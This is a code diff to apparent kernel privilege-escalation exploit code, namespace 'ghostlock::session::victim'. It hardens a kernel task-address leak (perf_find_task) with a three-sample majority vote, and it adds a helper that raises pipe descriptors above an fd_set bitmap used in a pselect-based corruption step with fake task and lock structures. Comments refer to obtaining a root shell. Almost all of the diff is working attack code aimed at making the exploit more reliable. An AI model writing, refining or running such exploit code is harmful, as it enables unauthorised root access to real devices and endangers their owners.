@@ -31,19 +31,20 @@ namespace ghostlock::session::victim {
         fcntl(p.uid_write.get(), F_SETFD, FD_CLOEXEC); /* keep the probe pipe out of the
                                           * root shell / ksud chain */
         prctl(PR_SET_NAME, "ghostleaf_0123456789");
-        /* a real leak reproduces, a fluke vote winner does not. w2 writes to
-     * this address, so two runs must agree or the leak is discarded. */
-        uintptr_t my_task = attack::perf_find_task();
-        int32_t leak_agreed = 0;
-        for (int32_t i = 0; i < 2 && my_task; i++) {
-            uintptr_t again = attack::perf_find_task();
-            if (again == my_task) {
-                leak_agreed = 1;
-                break;
-            }
-            my_task = again;
+        uintptr_t t[3] = {attack::perf_find_task(), 0, 0};
+        /* A real leak reproduces; a fluke vote winner does not. W2 writes to
+         * this address, so the samples must agree: accepting any two
+         * consecutive runs lets a systematic sampling bias through, which is
+         * exactly the shape a truncated perf ring produces. Three votes and a
+         * majority is the smallest form that rejects it. */
+        t[1] = attack::perf_find_task();
+        t[2] = attack::perf_find_task();
+        uintptr_t my_task = 0;
+        if (t[0] != 0 && (t[0] == t[1] || t[0] == t[2])) {
+            my_task = t[0];
+        } else if (t[1] != 0 && t[1] == t[2]) {
+            my_task = t[1];
         }
-        if (!leak_agreed) my_task = 0;
         write(p.task_write.get(), &my_task, sizeof(my_task));
         p.task_write.reset();
         if (!my_task) _exit(1);
@@ -166,9 +167,30 @@ namespace ghostlock::session::victim {
         park_child_process_forever();
     }
 
+    /* Move one end of a victim pipe above the fd_set bitmap. reserve_low_fds()
+     * parks /dev/null over the bitmap's numbers, but a descriptor that was
+     * already open when the park ran keeps its number, and the open_selected_fds
+     * dup2 pass redirects every set bit -- including the ones the waiter words
+     * light through fake_task, fake_lock and the write target. */
+    static int32_t raise_pipe_fd(int32_t fd) {
+        const int32_t high = fcntl(fd, F_DUPFD, kernel::PSELECT_ROUTE_NFDS + 96);
+        if (high < 0) {
+            pr_warning("pipe fd raise failed fd=%d errno=%d\n", fd, errno);
+            return -1;
+        }
+        close(fd);
+        return high;
+    }
+
     static pid_t spawn_child(VictimContext &p) {
         std::array<int32_t, 2> p1{}, p2{}, p3{};
         if (pipe(p1.data()) < 0 || pipe(p2.data()) < 0 || pipe(p3.data()) < 0) return -1;
+        std::array<int32_t *, 6> raised = {&p1[0], &p1[1], &p2[0], &p2[1], &p3[0], &p3[1]};
+        for (int32_t *fd : raised) {
+            const int32_t high = raise_pipe_fd(*fd);
+            if (high < 0) return -1;
+            *fd = high;
+        }
         p.task_read.reset(p1[0]);
         p.task_write.reset(p1[1]);
         p.cmd_read.reset(p2[0]);
